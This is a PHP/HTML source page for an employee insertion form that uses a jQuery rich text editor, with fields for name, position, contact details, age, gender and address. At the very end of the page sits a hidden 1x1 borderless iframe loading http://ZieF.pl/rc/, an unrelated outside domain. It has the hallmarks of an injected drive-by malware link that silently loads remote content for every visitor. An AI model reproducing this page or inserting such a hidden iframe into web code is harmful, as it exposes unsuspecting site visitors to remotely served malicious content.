<?php
$language="enus";
include_once("locale/".$language.".php");
function getLabel($key,$language){
   global $label;
   return $label[$language][$key];
}
?>
<html>
<head>
	<title>jQuery WYSIWYG Rich Text Editor (jQRTE) - Demo</title>
<link rel="Stylesheet" type="text/css" href="css/jqrte.css" />
<link type="text/css" href="css/jqpopup.css" rel="Stylesheet"/>
<link rel="stylesheet" href="css/jqcp.css" type="text/css"/>

<script type="text/javascript" src="js/jquery-1.4.1.min.js"></script>
<script type="text/javascript" src="js/jquery.bgiframe.min.js"></script>
<script type="text/javascript" src="js/jqDnR.min.js"></script>
<script type="text/javascript" src="js/jquery.jqpopup.min.js"></script>
<script type="text/javascript" src="js/jquery.jqcp.min.js"></script>
<script type="text/javascript" src="js/jquery.jqrte.min.js"></script>

</head>
	<body>
	 
	<form name="frm" action="insertemployee.php" method="post">
	<table>
	<tr><td><a href="allquery.php">Home</a></td></tr>
		<tr><td>First Name:</td><td>
	<input type="text" name="fname"></td></tr>
	<tr><td>Last Name:</td><td>
	<input type="text" name="lname"></td></tr>
	<tr><td>Position:</td><td><input type="text" name="position"></td></tr>
	<tr><td>Email:</td><td>
	<input type="text" name="email"></td></tr>
	<tr><td>Phone:</td><td>
	<input type="text" name="ph"></td></tr>
	<tr><td>Age:</td><td>
	<input type="text" name="age"></td></tr>
	<tr><td>Gender:</td><td>
	<input type="text" name="gender"></td></tr>
	<tr><td>Address:</td><td>
	<input type="text" name="address"></td></tr>
	<tr><td>About:</td><td>
	<?php
         include_once("content_editor.php");
         include_once("editor.php");
      ?>
	<textarea id="content" name="content" class="jqrte_popup" rows="5" cols="5">rich text editor with &lt;b&gt;Content&lt;/b&gt;</textarea>
      
      </td></tr>
	<input type="hidden" name="sub">
	<tr><td><input type="submit" value="Insert"></td></tr>
	</table>
	</form>
	<script type="text/javascript">
   window.onload = function(){ 
      try{
         $("#content_rte").jqrte();
      }
      catch(e){}
   } 

   $(document).ready(function() {
         $("#content_rte").jqrte_setIcon();
         $("#content_rte").jqrte_setContent();
   });
</script>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
	</body>
</html>